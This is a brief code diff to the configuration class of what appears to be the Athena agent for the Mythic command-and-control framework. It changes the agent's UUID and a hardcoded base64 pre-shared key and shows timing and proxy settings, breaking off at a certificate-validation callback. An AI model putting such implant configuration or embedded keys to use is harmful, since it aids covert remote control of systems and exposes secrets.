@@ -21,7 +21,7 @@ namespace Athena
         public MythicConfig()
         {
 
-            uuid = "49a95eb0-6044-421e-ab1d-552ffd2f66e5";
+            uuid = "229ee453-b580-4edb-b87f-32a6c7e3dc54";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("5", out sleep) ? sleep : 60;
@@ -63,7 +63,7 @@ namespace Athena
             this.proxyHost = ":";
             this.proxyPass = "";
             this.proxyUser = "";
-            this.psk = "QNfBXkhh2O0hfDrmh3kYhtZVkLfCb8ttFl0aCl+vILQ=";
+            this.psk = "7I/4/blZrzjOv9J31j1J+nPaoZOuwfQaEFiZmwsKqyU=";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
